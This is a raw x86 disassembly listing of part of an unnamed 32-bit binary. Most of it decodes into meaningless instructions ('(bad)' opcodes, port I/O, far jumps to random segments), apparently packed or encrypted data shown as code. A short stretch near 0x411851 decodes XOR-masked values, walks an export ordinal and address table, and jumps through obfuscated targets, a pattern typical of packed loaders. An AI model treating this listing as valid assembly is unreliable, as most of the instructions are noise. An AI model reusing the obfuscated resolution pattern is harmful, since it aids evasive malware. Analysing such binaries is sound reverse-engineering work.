  4112b5:	lock inc edi
  4112b7:	ja     0x411253
  4112b9:	test   al,0x44
  4112bb:	out    dx,eax
  4112bc:	jmp    0x41127c
  4112be:	jo     0x411283
  4112c0:	jmp    0x9fd2:0xabfdcd9f
  4112c7:	fimul  WORD PTR [edx]
  4112c9:	pop    ebx
  4112ca:	arpl   WORD PTR [eax+ebx*8+0x441bab9d],sp
  4112d1:	sub    al,0x47
  4112d3:	jle    0x411354
  4112d5:	fild   QWORD PTR [eax-0x55]
  4112d8:	into   
  4112d9:	xchg   edi,eax
  4112da:	scas   eax,DWORD PTR es:[edi]
  4112db:	(bad)  
  4112dc:	and    DWORD PTR [eax-0x744a2730],esi
  4112e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4112e3:	data16 mov BYTE PTR [edx-0x5d62ce79],0x3a
  4112eb:	mov    ah,0xd
  4112ed:	fldenv [ecx+0x4ab671aa]
  4112f3:	mov    bl,0xc7
  4112f5:	gs mov dh,0x27
  4112f8:	xor    eax,DWORD PTR [esi-0x3b360804]
  4112fe:	imul   ecx,DWORD PTR [ebx-0x6fbe0a15],0x5f773eaf
  411308:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411309:	ins    BYTE PTR es:[edi],dx
  41130a:	xchg   edx,eax
  41130b:	sbb    DWORD PTR [edi-0x297b5815],ebp
  411311:	xor    BYTE PTR [eax],0x2f
  411314:	icebp  
  411315:	add    esi,DWORD PTR [edx]
  411317:	sbb    al,0xcc
  411319:	retf   0xb7bb
  41131c:	mov    edi,0x2be54cfa
  411321:	mov    bl,0xd6
  411323:	cmp    al,0xbd
  411325:	jnp    0x4112be
  411327:	jns    0x4112b8
  411329:	out    dx,al
  41132a:	in     al,dx
  41132b:	mov    ds:0xf9796383,eax
  411330:	in     eax,dx
  411331:	fdivr  QWORD PTR [eax+edx*4]
  411334:	push   ss
  411335:	ret    0x9762
  411338:	iret   
  411339:	mov    bh,0x4d
  41133b:	aas    
  41133c:	jae    0x411314
  41133e:	fxch   st(6)
  411340:	call   FWORD PTR [ebp-0x3a]
  411343:	mov    ah,BYTE PTR [edx-0x670715f3]
  411349:	test   eax,0xda3f4f87
  41134e:	inc    esp
  41134f:	pop    edx
  411350:	cld    
  411351:	mov    eax,0x20526593
  411356:	xchg   ebp,eax
  411357:	pop    ecx
  411358:	dec    eax
  411359:	push   esp
  41135a:	dec    edi
  41135b:	mov    DWORD PTR [ebx+ebp*4],0x43f5751c
  411362:	pop    ecx
  411363:	jbe    0x41135c
  411365:	int    0xfa
  411367:	jmp    0x411374
  411369:	push   edi
  41136a:	jo     0x411362
  41136c:	push   0xffffffe2
  41136e:	add    cl,BYTE PTR [ecx]
  411370:	imul   eax,eax,0x8ef3a794
  411376:	cmp    DWORD PTR [ebp-0x389d5f87],0x8a1e372f
  411380:	mov    WORD PTR [edi+eax*2],es
  411383:	xor    esp,DWORD PTR [ebp+esi*2-0x2ac0799f]
  41138a:	mov    ebx,0xec34a9b2
  41138f:	dec    eax
  411390:	(bad)  
  411391:	out    0x37,al
  411393:	mov    ds:0xa59b8a42,eax
  411398:	lahf   
  411399:	mov    ebx,0x35fc3456
  41139e:	pop    es
  41139f:	adc    al,0x6a
  4113a1:	pop    ebx
  4113a2:	iret   
  4113a3:	sub    edx,DWORD PTR [ebx]
  4113a5:	jg     0x4113ae
  4113a7:	lock jb 0x41139b
  4113aa:	inc    edx
  4113ab:	jmp    0x41137d
  4113ad:	sete   BYTE PTR [ebp-0x20]
  4113b1:	mov    db5,ebx
  4113b4:	adc    al,0xed
  4113b6:	and    BYTE PTR [ebx-0x6b],bl
  4113b9:	push   0x43
  4113bb:	out    dx,al
  4113bc:	adc    BYTE PTR [esp+ecx*1-0xd],al
  4113c0:	add    eax,0x86fc60a2
  4113c5:	in     al,0xe5
  4113c7:	mov    fs,WORD PTR [esi]
  4113c9:	in     eax,0x62
  4113cb:	in     al,0x58
  4113cd:	mov    ah,BYTE PTR [ecx-0x12b010e7]
  4113d3:	or     BYTE PTR [ebx+0xfcecf3f],0xf5
  4113da:	pop    ss
  4113db:	sub    BYTE PTR [ecx-0x1dfd7800],bl
  4113e1:	xchg   ebp,eax
  4113e2:	pop    esp
  4113e3:	cmp    al,bh
  4113e5:	es xchg ebx,eax
  4113e7:	push   cs
  4113e8:	fcmovne st,st(3)
  4113ea:	push   DWORD PTR [edi*1-0x22106d6b]
  4113f1:	mov    bh,0xde
  4113f3:	pop    edi
  4113f4:	xor    esp,DWORD PTR [esi*1-0x4cbbc215]
  4113fb:	push   0x76747abb
  411400:	(bad)  
  411401:	shr    BYTE PTR [edi],cl
  411403:	jl     0x4113ab
  411405:	loope  0x411434
  411407:	mov    ch,0x5e
  411409:	cmc    
  41140a:	sub    DWORD PTR [eax],0x1406c5c5
  411410:	call   0x196bbf60
  411415:	adc    eax,0xa2db882c
  41141a:	pop    ss
  41141b:	rcr    esp,1
  41141d:	mov    ds:0xdc7e8f0f,al
  411422:	push   0xffffff9f
  411424:	aam    0x45
  411426:	cmc    
  411427:	in     al,dx
  411428:	inc    eax
  411429:	inc    edi
  41142a:	loope  0x4114a7
  41142c:	cmp    cl,BYTE PTR [eax+0x5a]
  41142f:	pusha  
  411430:	jg     0x4113cf
  411432:	mov    eax,ds:0x8e288fa4
  411437:	test   al,0xa7
  411439:	cmc    
  41143a:	jb     0x41142b
  41143c:	adc    ch,dl
  41143e:	sbb    BYTE PTR [ebx],bl
  411440:	aad    0xc1
  411442:	mov    edi,0xcfcb3c6c
  411447:	mov    cl,BYTE PTR [esi-0x3b]
  41144a:	bnd jp 0x41140e
  41144d:	cmp    DWORD PTR [ebp-0x8],esp
  411450:	int3   
  411451:	stos   BYTE PTR es:[edi],al
  411452:	ja     0x41142d
  411454:	cmp    BYTE PTR ss:[ebx+eiz*2+0x165aaf6d],dh
  41145c:	ds popf 
  41145e:	jo     0x41143e
  411460:	fadd   st(6),st
  411462:	shr    BYTE PTR [edx+0x7b3110f9],0x47
  411469:	mov    ds:0xbf289c0b,eax
  41146e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41146f:	aas    
  411470:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411471:	mov    ds,WORD PTR [ebx]
  411473:	arpl   WORD PTR [ebp-0x181c1585],di
  411479:	std    
  41147a:	lahf   
  41147b:	push   esp
  41147c:	xchg   eax,esp
  41147e:	and    DWORD PTR ds:0xf03f2894,0xffffffd3
  411485:	push   cs
  411486:	nop
  411487:	or     edi,edx
  411489:	loope  0x41147f
  41148b:	sub    eax,0x7dbbab1c
  411490:	or     eax,0x3abca2f5
  411495:	push   ss
  411496:	cmp    cl,BYTE PTR [ebx+0x20]
  411499:	sbb    edx,esp
  41149b:	mov    ds:0xbeb62df7,al
  4114a0:	repz rcl DWORD PTR [ebp-0x48],cl
  4114a4:	pop    ecx
  4114a5:	and    DWORD PTR [ecx],ebx
  4114a7:	test   al,0xe3
  4114a9:	loope  0x41151e
  4114ab:	push   edi
  4114ac:	lock into 
  4114ae:	inc    esi
  4114af:	rcr    BYTE PTR [eax+ebp*2-0x38],1
  4114b3:	lock jg 0x4114a8
  4114b6:	adc    BYTE PTR [esi+eax*1-0x103333a4],0xd3
  4114be:	xchg   edx,eax
  4114bf:	das    
  4114c0:	fadd   QWORD PTR [ecx-0x6c]
  4114c3:	in     al,0x1e
  4114c5:	inc    ebx
  4114c6:	add    ebx,DWORD PTR [eax+0x68801557]
  4114cc:	mov    edi,0xb13d677f
  4114d1:	pop    ebx
  4114d2:	mov    edi,0xb51c97f7
  4114d7:	push   edi
  4114d8:	xchg   DWORD PTR [edi+ecx*8+0x1e],ebp
  4114dc:	add    bh,bl
  4114de:	ror    DWORD PTR [edi+edx*1-0x7b],1
  4114e2:	inc    esi
  4114e3:	std    
  4114e4:	inc    ecx
  4114e5:	jmp    0xffe41bac
  4114ea:	outs   dx,DWORD PTR ds:[esi]
  4114eb:	rcr    dl,cl
  4114ed:	and    DWORD PTR [eax+0x373412c0],ecx
  4114f3:	ins    DWORD PTR es:[edi],dx
  4114f4:	sbb    DWORD PTR [esi+0x3b3e2b16],ebx
  4114fa:	jae    0x41157a
  4114fc:	popa   
  4114fd:	sub    bh,BYTE PTR [edx]
  4114ff:	fst    st(2)
  411501:	push   ebx
  411502:	mov    ds,WORD PTR [edi-0x7f2b0755]
  411508:	out    0x9e,eax
  41150a:	inc    eax
  41150b:	push   ds
  41150c:	xchg   cl,ch
  41150e:	(bad)  
  41150f:	push   ds
  411510:	mov    edx,0x6cce85e5
  411515:	xor    al,0x59
  411517:	dec    edi
  411518:	xchg   ebx,eax
  411519:	(bad)  
  41151a:	fld1   
  41151c:	jnp    0x4114e9
  41151e:	add    al,0x9f
  411520:	add    al,0x81
  411522:	xchg   edx,eax
  411523:	sbb    cl,BYTE PTR [di]
  411526:	fucomp st(0)
  411528:	cmp    BYTE PTR [ebx-0x68],ch
  41152b:	xor    eax,DWORD PTR [ebx]
  41152d:	loop   0x4114f1
  41152f:	popa   
  411530:	xor    al,0x74
  411532:	imul   edi,DWORD PTR [ebp-0x2b],0x65
  411536:	xchg   edx,eax
  411537:	es sub eax,0xfe9c0feb
  41153d:	imul   esp,DWORD PTR [ebx+0x75],0x5
  411541:	pop    ebx
  411542:	int    0x4d
  411544:	out    dx,al
  411545:	scas   al,BYTE PTR es:[edi]
  411546:	jbe    0x41158e
  411548:	fdivr  QWORD PTR [ebp+0x12e9f691]
  41154e:	ds enter 0x5a61,0x3b
  411553:	inc    edi
  411554:	mov    bh,0x83
  411556:	(bad)  
  411557:	out    dx,al
  411558:	mov    ds:0x5c437df6,al
  41155d:	cmc    
  41155e:	repz or al,BYTE PTR [edi]
  411561:	lods   eax,DWORD PTR ds:[esi]
  411562:	jmp    0x398b292e
  411567:	and    DWORD PTR [eax-0x327bb64d],edi
  41156d:	add    al,0xe0
  41156f:	inc    eax
  411570:	js     0x411568
  411572:	xchg   dh,ch
  411574:	add    bh,BYTE PTR [ecx+0x16666def]
  41157a:	mov    al,ds:0x4c53a24
  41157f:	rcr    BYTE PTR [edi],1
  411581:	stos   BYTE PTR es:[edi],al
  411582:	jecxz  0x4115e7
  411584:	test   BYTE PTR [eax],al
  411586:	mov    ebp,0xfc6feee1
  41158b:	mov    DWORD PTR [ebp+0xe],ebp
  41158e:	int3   
  41158f:	push   ss
  411590:	aad    0xff
  411592:	add    bl,cl
  411594:	jbe    0x41154d
  411596:	out    0xfb,al
  411598:	push   eax
  411599:	and    eax,0x130bdc56
  41159e:	cwde   
  41159f:	lahf   
  4115a0:	jbe    0x411547
  4115a2:	(bad)  
  4115a3:	int3   
  4115a4:	icebp  
  4115a5:	mov    ds:0x58474f88,eax
  4115aa:	adc    bl,BYTE PTR ds:0x8de3e30e
  4115b0:	mov    ch,0x93
  4115b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4115b3:	jo     0x411536
  4115b5:	or     dl,dl
  4115b7:	sub    ebp,DWORD PTR [esi]
  4115b9:	mov    ch,BYTE PTR [ebp+0x36]
  4115bc:	add    DWORD PTR [esi],edi
  4115be:	sahf   
  4115bf:	popf   
  4115c0:	popf   
  4115c1:	fmul   QWORD PTR [eax-0x6a]
  4115c4:	jb     0x4115b5
  4115c6:	push   esi
  4115c7:	ins    BYTE PTR es:[edi],dx
  4115c8:	fcmovbe st,st(1)
  4115ca:	fs push ecx
  4115cc:	mov    ah,0x23
  4115ce:	inc    eax
  4115cf:	loop   0x4115cf
  4115d1:	jmp    0x3e5f:0x1189f906
  4115d8:	pop    ss
  4115d9:	inc    ecx
  4115da:	ficomp DWORD PTR [ecx-0x2c]
  4115dd:	das    
  4115de:	pop    edi
  4115df:	lock popa 
  4115e1:	xor    al,0x55
  4115e3:	shl    BYTE PTR [esi+0x5247906d],cl
  4115e9:	pusha  
  4115ea:	loopne 0x41158e
  4115ec:	imul   edi,DWORD PTR [ebp+ebp*2+0x3dab0d08],0xffffffc9
  4115f4:	cmp    edi,ecx
  4115f6:	or     al,0x6e
  4115f8:	cli    
  4115f9:	ja     0x4115d9
  4115fb:	xor    DWORD PTR [eax+edx*1],edx
  4115fe:	in     al,dx
  4115ff:	jle    0x4115a2
  411601:	adc    dh,BYTE PTR [esi]
  411603:	mov    ch,0x5
  411605:	dec    edi
  411606:	retf   0x4a16
  411609:	call   0x70103723
  41160e:	(bad)  
  41160f:	mov    cs,WORD PTR [bp+si+0x14cf]
  411614:	stos   BYTE PTR es:[edi],al
  411615:	imul   edi,esi,0xc2eff19f
  41161b:	xchg   BYTE PTR [edi],dl
  41161d:	add    esi,DWORD PTR [ecx-0x1e67f188]
  411623:	es pop ds
  411625:	adc    DWORD PTR [edi],edx
  411627:	ins    DWORD PTR es:[edi],dx
  411628:	xor    ebp,DWORD PTR [ebp+0x12]
  41162b:	data16 jne 0x41166a
  41162e:	jecxz  0x4116a8
  411630:	push   0xf45846ce
  411635:	fucomi st,st(4)
  411637:	mov    esi,0x5a159fa2
  41163c:	ss (bad) 
  41163e:	and    eax,0x1e169f14
  411643:	dec    esi
  411644:	xchg   ecx,eax
  411645:	mov    dl,0xcc
  411647:	cmp    eax,0x6663ff7e
  41164c:	add    BYTE PTR [eax-0x7ec15431],0x77
  411653:	idiv   BYTE PTR [edx-0x41]
  411656:	lock and DWORD PTR [ebx],esp
  411659:	sar    DWORD PTR [edi+edi*1],0xa3
  41165d:	aas    
  41165e:	cmp    BYTE PTR [ebx+0x312e6016],0x4e
  411665:	iret   
  411666:	add    dh,BYTE PTR [ebp+0x54bc6599]
  41166c:	xor    BYTE PTR [eax+0x374ef032],dl
  411672:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  411674:	mov    cl,BYTE PTR [ecx+eiz*1+0x24]
  411678:	mov    edi,0x34c27990
  41167d:	mov    edx,0x1a8da1db
  411682:	xchg   ecx,eax
  411683:	mov    WORD PTR [ebp+0x6cd584cd],cs
  411689:	adc    BYTE PTR [edi+ecx*1-0x69],al
  41168d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41168e:	fidivr DWORD PTR [eax-0x52e7a8ad]
  411694:	and    DWORD PTR [ebp+0x22d93542],edi
  41169a:	adc    ecx,DWORD PTR [ebp-0x21b41bac]
  4116a0:	scas   eax,DWORD PTR es:[edi]
  4116a1:	mov    ah,0xc7
  4116a3:	mov    BYTE PTR [ecx-0xbd29f73],ch
  4116a9:	mov    ebp,edx
  4116ab:	js     0x411631
  4116ad:	scas   al,BYTE PTR es:[edi]
  4116ae:	mov    edi,0x762d6fe1
  4116b3:	add    ebx,DWORD PTR [eax]
  4116b5:	push   0x94296f94
  4116ba:	test   BYTE PTR [ebx-0x6b24721d],0xc5
  4116c1:	mov    WORD PTR ds:0x811f2792,fs
  4116c7:	outs   dx,BYTE PTR ds:[esi]
  4116c8:	adc    eax,0x8fbe1034
  4116cd:	lahf   
  4116ce:	jmp    0x56382a92
  4116d3:	xor    al,0x7f
  4116d5:	push   edx
  4116d6:	sub    edx,DWORD PTR [edi+edi*2]
  4116d9:	mov    ecx,0xdf065c41
  4116de:	ret    
  4116df:	xchg   ecx,eax
  4116e0:	add    dh,dl
  4116e2:	inc    ebp
  4116e3:	in     eax,0x45
  4116e5:	jge    0x411683
  4116e7:	adc    BYTE PTR [ebp+0x7c89474a],ah
  4116ed:	sbb    eax,0xe8d2aeee
  4116f2:	out    dx,al
  4116f3:	jnp    0x411700
  4116f5:	mov    edx,0x7baf461a
  4116fa:	mov    ds:0xdd322be2,eax
  4116ff:	repz test DWORD PTR [eax+0x16],0xbcf62d3d
  411707:	lods   al,BYTE PTR ds:[esi]
  411708:	call   0x1bf3eb78
  41170d:	push   0x131ecf75
  411712:	jp     0x41176c
  411714:	pop    es
  411715:	mov    bh,0xde
  411717:	in     eax,0x95
  411719:	loope  0x411743
  41171b:	dec    esp
  41171c:	loope  0x4116ca
  41171e:	jne    0x41172a
  411720:	outs   dx,DWORD PTR ds:[esi]
  411721:	fild   DWORD PTR [esi-0x7d]
  411724:	stc    
  411725:	add    BYTE PTR [ebx+0x37],dh
  411728:	mov    ds:0xdcff50d1,al
  41172d:	xor    eax,0xa5d634e5
  411732:	xor    ch,BYTE PTR [esi+0x14]
  411735:	pop    eax
  411736:	repnz adc al,0x92
  411739:	xor    esi,esi
  41173b:	ret    0xaae3
  41173e:	sti    
  41173f:	in     eax,0xe9
  411741:	in     al,0x54
  411743:	in     al,dx
  411744:	sub    eax,0x6c464a3a
  411749:	out    dx,al
  41174a:	xor    eax,0x62c62da2
  41174f:	test   BYTE PTR [ecx+0x50],0xfd
  411753:	lahf   
  411754:	aaa    
  411755:	push   cs
  411756:	pop    ebx
  411757:	xor    BYTE PTR [ecx-0x2a],0x8c
  41175b:	push   cs
  41175c:	cdq    
  41175d:	cmp    cl,BYTE PTR [ecx]
  41175f:	push   ecx
  411760:	mov    ds,edx
  411762:	idiv   BYTE PTR [ebp+0x35e6ac42]
  411768:	pushf  
  411769:	data16 jecxz 0x4117bf
  41176c:	xor    BYTE PTR [ecx+0x69],ch
  41176f:	cs sub al,0x15
  411772:	int    0x54
  411774:	add    eax,0x995f81d6
  411779:	dec    edx
  41177a:	xchg   al,bh
  41177c:	jae    0x4117e7
  41177e:	adc    al,0x3b
  411780:	fidiv  DWORD PTR [eax]
  411782:	call   0xb557:0x5214bd7d
  411789:	test   eax,0x7ceb974a
  41178e:	aad    0xf6
  411790:	mov    esp,0xde98e887
  411795:	loopne 0x4117cd
  411797:	push   ecx
  411798:	in     eax,dx
  411799:	scas   eax,DWORD PTR es:[edi]
  41179a:	stos   BYTE PTR es:[edi],al
  41179b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41179c:	mov    eax,0xc45141fa
  4117a1:	inc    eax
  4117a2:	xchg   DWORD PTR [eax-0x52],edx
  4117a5:	jo     0x411735
  4117a7:	mov    bl,BYTE PTR [ebx+0x257902c9]
  4117ad:	cmp    al,al
  4117af:	pop    edi
  4117b0:	mov    esi,0x65572ab6
  4117b5:	sahf   
  4117b6:	sub    eax,DWORD PTR [esp+edx*4+0x8854f12]
  4117bd:	and    DWORD PTR [ebx+0x3b],esp
  4117c0:	shl    BYTE PTR [esi+0x685a8a8d],1
  4117c6:	inc    ecx
  4117c7:	(bad)  
  4117c8:	xchg   esi,eax
  4117c9:	call   0xe465f2db
  4117ce:	retf   
  4117cf:	adc    esp,edi
  4117d1:	pushf  
  4117d2:	inc    edx
  4117d3:	jle    0x4117a6
  4117d5:	sub    dl,BYTE PTR [edx-0x23]
  4117d8:	sbb    al,0x7d
  4117da:	or     al,0xcf
  4117dc:	into   
  4117dd:	ret    0x65c7
  4117e0:	outs   dx,BYTE PTR ds:[esi]
  4117e1:	dec    esp
  4117e2:	pop    es
  4117e3:	sar    DWORD PTR [edi],cl
  4117e5:	push   edi
  4117e6:	leave  
  4117e7:	sub    al,0x32
  4117e9:	lea    eax,[esi]
  4117eb:	mov    ah,BYTE PTR [ecx]
  4117ed:	lock sti 
  4117ef:	mov    dh,0x9
  4117f1:	mov    esp,0xb39da1c7
  4117f6:	and    ebp,DWORD PTR [eax]
  4117f8:	inc    ebp
  4117f9:	mov    esi,0xa3aa8826
  4117fe:	pop    ds
  4117ff:	icebp  
  411800:	sbb    al,BYTE PTR [ecx-0x48]
  411803:	into   
  411804:	mov    edx,0x99d79b88
  411809:	jmp    edx
  41180b:	inc    edx
  41180c:	xor    ch,BYTE PTR ds:0xb47808fa
  411812:	mov    DWORD PTR [eax+0x16],ebp
  411815:	cwde   
  411816:	jnp    0x41179b
  411818:	mov    bh,0x4
  41181a:	fnstcw WORD PTR [edx-0x71e9a800]
  411820:	sub    cl,BYTE PTR [eax+0x4e]
  411823:	jecxz  0x4117c9
  411825:	aaa    
  411826:	push   ecx
  411827:	test   eax,0x5675b18f
  41182c:	ret    
  41182d:	in     eax,0x31
  41182f:	xchg   esi,eax
  411830:	sub    WORD PTR [ecx-0x558eaf2d],cx
  411837:	or     eax,ecx
  411839:	or     bl,BYTE PTR [edx+0x48868b0a]
  41183f:	mov    eax,ds:0xd0063f20
  411844:	push   0xffffffa4
  411846:	je     0x411884
  41184c:	jmp    0x411875
  411851:	mov    eax,DWORD PTR [ebp-0x4]
  411854:	mov    ecx,DWORD PTR [ebp-0x8]
  411857:	xor    eax,esi
  411859:	add    eax,edi
  41185b:	cmp    ecx,eax
  41185d:	mov    eax,DWORD PTR [ebp-0x4]
  411860:	je     0x4118bf
  411866:	mov    ecx,DWORD PTR [ebp-0x30]
  411869:	xor    eax,esi
  41186b:	add    eax,edi
  41186d:	cmp    ecx,eax
  41186f:	je     0x4118c8
  411875:	lea    eax,[ebp-0x8]
  411878:	push   eax
  411879:	push   DWORD PTR [ebp-0x28]
  41187c:	push   DWORD PTR [ebp+0xc]
  41187f:	call   0x416204
  411884:	mov    eax,DWORD PTR [ebp-0x4]
  411887:	mov    ecx,DWORD PTR [ebp-0x8]
  41188a:	xor    eax,esi
  41188c:	add    eax,edi
  41188e:	cmp    ecx,eax
  411890:	je     0x4118ab
  411896:	mov    eax,DWORD PTR [ebp-0x34]
  411899:	movzx  eax,WORD PTR [eax+ebx*2]
  41189d:	mov    ecx,DWORD PTR [ebp-0x14]
  4118a0:	mov    eax,DWORD PTR [ecx+eax*4]
  4118a3:	mov    DWORD PTR [ebp-0x38],eax
  4118a6:	jmp    0x411851
  4118ab:	mov    eax,DWORD PTR [ebp-0xc]
  4118ae:	xor    eax,esi
  4118b0:	lea    ebx,[ebx+eax*1+0x3272ec]
  4118b7:	jmp    0x40f134
  4118bc:	mov    eax,DWORD PTR [ebp-0x4]
  4118bf:	xor    eax,esi
  4118c1:	add    eax,edi
  4118c3:	jmp    0x416111
  4118c8:	mov    eax,DWORD PTR [ebp-0x38]
  4118cb:	add    eax,DWORD PTR [ebp+0x8]
  4118ce:	mov    DWORD PTR [ebp-0x18],eax
  4118d1:	mov    eax,DWORD PTR [ebp-0x1c]
  4118d4:	test   eax,eax
  4118d6:	jmp    0x413c6c
  4118db:	js     0x411873
  4118dd:	jno    0x411933
  4118df:	arpl   WORD PTR [edi+0x68fe867b],dx
  4118e5:	test   DWORD PTR [ebp+0x3c0da011],ebx
  4118eb:	dec    ecx
  4118ec:	cmp    DWORD PTR [edx+0x7a],0x5
  4118f0:	pop    edi
  4118f1:	jp     0x41196d
  4118f3:	pop    ds
  4118f4:	fisub  DWORD PTR [eax]
  4118f6:	inc    edi
  4118f7:	dec    edi
  4118f8:	popa   
  4118f9:	adc    al,0xa4
  4118fb:	or     BYTE PTR [eax-0x18b14acd],dl
  411901:	mov    bl,ch
  411903:	and    bl,BYTE PTR [ebp+0xdad28b4]
  411909:	mov    ch,0x97
  41190b:	lods   eax,DWORD PTR ds:[esi]
  41190c:	jae    0x4118ad
  41190e:	fst    QWORD PTR [edi+edi*8-0x1957f9c]
  411915:	cwde   
  411916:	mov    cl,0x64
  411918:	daa    
  411919:	xchg   ebp,eax
  41191a:	rol    al,0x10
  41191d:	add    al,0x50
  41191f:	addr16 imul esp,eax,0xbe5ca98
  411926:	sbb    ch,BYTE PTR [ecx+0x18]
  411929:	in     al,dx
  41192a:	xor    al,0x92
  41192c:	ror    BYTE PTR [eiz*8-0xc028b4b],1
  411933:	mov    ds:0x46bb3243,al
  411938:	sbb    DWORD PTR [ebx+0x77],ebx
  41193b:	adc    BYTE PTR [edx],al
  41193d:	jns    0x41199d
  41193f:	in     eax,0xdd
  411941:	rol    BYTE PTR fs:[ecx],0xdc
  411945:	xchg   DWORD PTR [edi-0x69],ebx
  411948:	ja     0x411938
  41194a:	pop    ebp
  41194b:	pop    eax
  41194c:	jno    0x411915
  41194e:	hlt    
  41194f:	mov    BYTE PTR [eax+0x2d],bl
  411952:	(bad)  
  411953:	jmp    0x1ca30294
  411958:	mov    ch,BYTE PTR [edi]
  41195a:	push   eax
  41195b:	jb     0x41198a
  41195d:	mov    eax,ds:0x669994af
  411962:	inc    ebx
  411963:	mov    al,ds:0x2835504d
  411968:	dec    esp
  411969:	and    bh,BYTE PTR [esi]
  41196b:	call   0xeb78:0xd2ec5b5b
  411972:	aam    0x27
  411974:	int3   
  411975:	lods   al,BYTE PTR ds:[esi]
  411976:	(bad)  
  411977:	in     al,dx
  411978:	rcl    ch,0x6e
  41197b:	pop    DWORD PTR [ebp-0x2a10b5b1]
  411981:	or     BYTE PTR [ebp-0x58],0xcf
  411985:	dec    ebx
  411986:	jo     0x4119bd
  411988:	ds xor ah,ch
  41198b:	(bad)  
  41198c:	(bad)  
  41198e:	sbb    bh,BYTE PTR ds:0x80722a78
  411994:	shl    BYTE PTR [esi],0x8b
  411997:	fs out dx,al
  411999:	mov    edx,DWORD PTR [ecx]
  41199b:	push   ds
  41199c:	popa   
  41199d:	cmp    BYTE PTR [edi],bl
  41199f:	and    al,0xe1
  4119a1:	cmp    BYTE PTR ds:0xc426fa48,ch
  4119a7:	cmp    BYTE PTR [edx],dl
  4119a9:	push   ds
  4119aa:	sub    al,0x25
  4119ac:	adc    eax,0x4b46c0f4
  4119b1:	out    0xf9,eax
  4119b3:	push   ds
  4119b4:	jae    0x411976
  4119b6:	xchg   cx,ax
  4119b8:	inc    esi
  4119b9:	or     edi,ebp
  4119bb:	push   esp
  4119bc:	jae    0x411a01
  4119be:	or     DWORD PTR [ecx-0x21],edi
  4119c1:	popf   
  4119c2:	push   es
  4119c3:	imul   eax,DWORD PTR [esi-0x3a50ed94],0x807c3b38
  4119cd:	jle    0x411a40
  4119cf:	loope  0x4119da
  4119d1:	inc    DWORD PTR [eax+0x73]
  4119d4:	mov    al,ds:0x9208c017
  4119d9:	sti    
  4119da:	pop    ds
  4119db:	mov    al,0xf
  4119dd:	lods   al,BYTE PTR ds:[esi]
  4119de:	dec    esi
  4119df:	dec    edx
  4119e0:	mov    DWORD PTR gs:[ebp-0x313e2985],esi
  4119e7:	psadbw mm1,QWORD PTR [edi]
  4119ea:	jp     0x411a07
  4119ec:	push   esi
  4119ed:	imul   edx,DWORD PTR [ecx],0xffffffbf
  4119f0:	lea    ecx,[eax]
  4119f2:	ins    BYTE PTR es:[edi],dx
  4119f3:	jno    0x411a2b
  4119f5:	sar    DWORD PTR [ebx],0xb4
  4119f8:	(bad)
  4119fb:	test   dl,ah
  4119fd:	int    0xa8
  4119ff:	sub    al,0x1d
  411a01:	test   DWORD PTR [ebx+0x3c8abbae],edi
  411a07:	pop    es
  411a08:	xlat   BYTE PTR ds:[ebx]
  411a09:	stc    
  411a0a:	jg     0x4119ad
  411a0c:	push   ss
  411a0d:	dec    esp
  411a0e:	enter  0x86f4,0x60
  411a12:	cli    
  411a13:	or     edi,DWORD PTR [edi+0x6b]
  411a16:	stc    
  411a17:	push   edx
  411a18:	adc    BYTE PTR [ebx+0x54],bl
  411a1b:	rcl    dl,0x68
  411a1e:	adc    eax,esi
  411a20:	mov    ebp,db0
  411a23:	push   es
  411a24:	push   esi
  411a26:	dec    ebp
  411a27:	mov    dh,0xc4
  411a29:	addr16 dec ecx
  411a2b:	and    ebx,DWORD PTR [edx-0x14111f2a]
  411a31:	sti    
  411a32:	(bad)  
  411a33:	pusha  
  411a34:	add    al,0xae
  411a36:	(bad)  
  411a38:	push   es
  411a39:	mov    ecx,0x3bf29736
  411a3e:	sub    bh,dh
  411a40:	mov    ebp,0x97e564ac
  411a45:	cs and eax,0x3cd77568
  411a4b:	mov    ecx,0x5126346b
  411a50:	inc    eax
  411a51:	inc    ecx
  411a52:	dec    esp
  411a53:	sub    DWORD PTR [edi+0x438655c1],eax
  411a59:	in     eax,0x1f
  411a5b:	sbb    bl,bl
  411a5d:	add    al,0x31
  411a5f:	jecxz  0x4119fc
  411a61:	and    eax,0x708ceaf3
  411a66:	adc    BYTE PTR [ecx],al
  411a68:	je     0x411a90
  411a6a:	in     al,0xc0
  411a6c:	cmp    ebp,DWORD PTR [ecx+esi*2]
  411a6f:	push   esp
  411a70:	mov    WORD PTR [ebp+0x2e40dcb0],?
  411a76:	scas   eax,DWORD PTR es:[edi]
  411a77:	test   al,0x3e
  411a79:	xor    eax,0xd71f412e
  411a7e:	jns    0x411a94
  411a80:	(bad)
  411a84:	and    BYTE PTR [ecx-0x4dfe19e1],bl
  411a8a:	paddusw mm4,QWORD PTR [edi-0x3f]
  411a8e:	lds    esi,FWORD PTR [ecx]
  411a90:	cmc    
  411a91:	in     al,dx
  411a92:	paddsb mm6,mm1
  411a95:	jl     0x411a94
  411a97:	mov    bl,0x66
  411a99:	ins    DWORD PTR es:[edi],dx
  411a9a:	inc    ecx
  411a9b:	dec    edx
  411a9c:	cdq    
  411a9d:	and    dh,dh
  411a9f:	adc    DWORD PTR [eax+0x45],ebx
  411aa2:	icebp  
  411aa3:	call   0x45c8b51f
  411aa8:	hlt    
  411aa9:	xchg   esp,eax
  411aaa:	out    dx,al
  411aab:	loope  0x411a38
  411aad:	in     al,0x61
  411aaf:	sahf   
  411ab0:	js     0x411af8
  411ab2:	inc    edi
  411ab3:	test   BYTE PTR [edi],dh
  411ab5:	ret    0x81dc
  411ab8:	bound  ebx,QWORD PTR [edi+0x63]
  411abb:	out    dx,eax
  411abc:	and    ch,cl
  411abe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411abf:	and    al,0x52
  411ac1:	test   DWORD PTR [eax],edx
  411ac3:	xor    bl,BYTE PTR [eax+esi*2+0x34]
  411ac7:	out    dx,al
  411ac8:	nop
  411ac9:	test   eax,0x2d31f8b5
  411ace:	sub    BYTE PTR [ecx],al
  411ad0:	sub    eax,esi
  411ad2:	pusha  
  411ad3:	xchg   ecx,eax
  411ad4:	mov    esi,0xd5af1ee8
  411ad9:	call   0x89b5c856
